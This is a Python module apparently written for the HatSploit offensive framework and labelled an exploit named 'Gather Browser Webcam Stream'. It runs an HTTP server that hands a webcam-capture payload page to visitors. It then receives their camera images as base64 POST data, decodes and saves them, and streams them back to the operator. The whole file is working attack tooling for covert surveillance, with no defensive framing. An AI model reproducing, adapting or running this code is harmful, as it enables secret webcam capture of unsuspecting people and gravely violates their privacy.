#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

import os

from hatsploit.lib.module import Module
from hatsploit.lib.loot import Loot

from hatsploit.utils.http import HTTPClient
from hatsploit.utils.stream import StreamClient
from hatsploit.utils.string import StringTools


class HatSploitModule(Module, HTTPClient, StreamClient, StringTools):
    loot = Loot()

    update = False

    details = {
        'Category': "exploit",
        'Name': "Gather Browser Webcam Stream",
        'Module': "exploit/generic/gather/browser_webcam_stream",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer'
        ],
        'Description': "Module streams webcam through browser.",
        'Platform': "generic",
        'Rank': "medium"
    }

    options = {
        'SRVHOST': {
            'Description': "Host to start http server on.",
            'Value': "0.0.0.0",
            'Type': "ip",
            'Required': True
        },
        'SRVPORT': {
            'Description': "Port to start http server on.",
            'Value': 8080,
            'Type': "port",
            'Required': True
        },
        'FILE': {
            'Description': "File to save photo.",
            'Value': loot.random_loot('png'),
            'Type': None,
            'Required': True
        },
        'URLPATH': {
            'Description': "File path on server.",
            'Value': "/",
            'Type': None,
            'Required': True
        }
    }

    def run(self):
        server_host, server_port, file, url_path = self.parse_options(self.options)

        def GET(request):
            if request.path == url_path:
                payload = self.loot.get_data('webcam/index.html')
                self.print_process("Delivering payload...")

                request.send_status(200)
                request.wfile.write(payload)

        def POST(request):
            request.send_status(200)

            try:
                photo_length = int(request.headers['Content-Length'])

                post_data = request.rfile.read(photo_length)
                post_data = post_data.split(b',', 1)[1]

                photo_data = self.base64_decode(post_data, False)

            except Exception as e:
                return

            if self.update:
                self.loot.remove_loot(os.path.split(file)[1])
                self.loot.save_loot(os.path.split(file)[1], photo_data)
            else:
                self.loot.save_loot(os.path.split(file)[1], photo_data)
                self.update = True

        streamer = self.open_stream(self.loot.random_loot('html'), file)

        if streamer.create():
            streamer.stream()
        else:
            return

        self.http_server(
            server_host,
            server_port,
            {
                'GET': GET,
                'POST': POST
            },
            True
        )
